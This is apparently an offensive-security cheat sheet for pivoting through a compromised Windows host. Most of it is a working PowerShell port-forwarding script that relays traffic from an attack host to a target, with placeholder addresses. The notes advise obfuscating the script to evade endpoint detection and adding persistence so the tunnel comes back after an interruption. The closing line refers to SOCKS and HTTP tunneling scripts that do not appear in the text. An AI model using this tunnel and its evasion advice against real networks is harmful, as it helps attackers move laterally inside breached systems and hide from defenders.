Attack Host = `<attack_ip>`, `<attack_port>`
Pivot Host = `<pivot_ip>`, `<pivot_port>`
Target Host = `<target_ip>`, `<target_port>`

In a scenario where you're attempting to tunnel or pivot from the **Attack Host** (`<attack_ip>`, `<attack_port>`) to the **Target Host** (`<target_ip>`, `<target_port>`) via a **Pivot Host** (`<pivot_ip>`, `<pivot_port>`), PowerShell offers several methods to facilitate tunneling and pivoting through the network. Below is a collection of PowerShell-based scripts and techniques that can be used for this purpose. The scripts assume you have code execution on the **Pivot Host** and want to set up the tunnel for traffic from the **Attack Host** to reach the **Target Host**.

# PowerShell Port Forwarding (Local to Remote Forwarding via Pivot)

This script sets up a local-to-remote port forwarding. The **Pivot Host** listens on a local port and forwards traffic to the **Target Host**.

```powershell
# Parameters
$localPort = <pivot_port>          # Port on Pivot Host
$remoteHost = "<target_ip>"        # Target Host
$remotePort = <target_port>        # Port on Target Host
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $localPort)
$listener.Start()

while ($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()

    # Connect to Target Host from Pivot Host
    $targetClient = New-Object System.Net.Sockets.TcpClient($remoteHost, $remotePort)
    $targetStream = $targetClient.GetStream()

    # Start forwarding data
    Start-Job -ScriptBlock {
        param ($stream1, $stream2)
        while ($stream1.ReadTimeout -ge 0) {
            $buffer = New-Object Byte[] 1024
            $bytesRead = $stream1.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -gt 0) {
                $stream2.Write($buffer, 0, $bytesRead)
                $stream2.Flush()
            }
        }
    } -ArgumentList $stream, $targetStream

    Start-Job -ScriptBlock {
        param ($stream1, $stream2)
        while ($stream2.ReadTimeout -ge 0) {
            $buffer = New-Object Byte[] 1024
            $bytesRead = $stream2.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -gt 0) {
                $stream1.Write($buffer, 0, $bytesRead)
                $stream1.Flush()
            }
        }
    } -ArgumentList $targetStream, $stream
}
```

# Notes
- Replace the placeholders `<attack_ip>`, `<attack_port>`, `<pivot_ip>`, `<pivot_port>`, `<target_ip>`, and `<target_port>` with the actual IP addresses and port numbers.
- Consider security controls such as firewalls and endpoint detection and response (EDR) solutions that might interfere with PowerShell-based tunneling. Always obfuscate your PowerShell scripts or use techniques to evade detection.
- For extended use, ensure persistence or utilize task scheduling techniques to re-establish the tunnel if the process is interrupted.

Each of these scripts or techniques serves a different purpose, from simple port forwarding to complex SOCKS and HTTP tunneling. Choose the one that fits your operational needs based on the environment and the complexity of your pivoting requirements.